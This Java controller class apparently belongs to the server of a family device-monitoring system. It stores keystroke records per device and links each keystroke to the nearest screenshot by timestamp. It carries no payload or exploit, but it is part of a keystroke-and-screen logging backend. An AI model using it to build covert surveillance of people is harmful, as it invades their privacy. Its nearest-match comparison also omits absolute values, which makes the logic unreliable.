package com.family.server.controller;

import java.util.List;

import com.family.server.model.KeyStroke;
import com.family.server.model.Screenshot;
import com.family.server.repository.KeyStrokeDAO;
import com.family.server.repository.ScreenshotDAO;

public class KeyStrokeController {
	public KeyStrokeController()
	{
		
	}
	
	public Screenshot getScreetshotByKeyStroke(KeyStroke ks)
	{
		ScreenshotDAO sDao = new ScreenshotDAO(); 
		List<Screenshot> ls = sDao.getALL(); 
		sDao.close();
		int left = 0, 
		right = ls.size() -1; 
		while(left <= right) 
		{ 
			int mid = left + (right - left)/2; 
			if(ls.get(mid).getCreateAt().getTime() < ks.getCreateAt().getTime()) 
				left = mid + 1; 
			else 
				right = mid -1; 
		} 
		if(right < 0) 
			return ls.get(left); 
		if(left > ls.size()-1) 
			return ls.get(right); 
		if((ls.get(left).getCreateAt().getTime()-ks.getCreateAt().getTime()) < (ls.get(right).getCreateAt().getTime()-ks.getCreateAt().getTime())) 
			return ls.get(left); 
		else 
			return ls.get(right);
		
	}
	
	public List<KeyStroke> getAllOfDevice(String DeviceID)
	{
		KeyStrokeDAO ksDAO = new KeyStrokeDAO();
		List<KeyStroke> li = ksDAO.GetAllOfDevides(DeviceID);
		ksDAO.close();
		return li;
	}
	
	public void addKeyStroke(KeyStroke model)
	{
		KeyStrokeDAO ksDAO = new KeyStrokeDAO();
		ksDAO.addKeyStroke(model);
		ksDAO.close();
	}
}
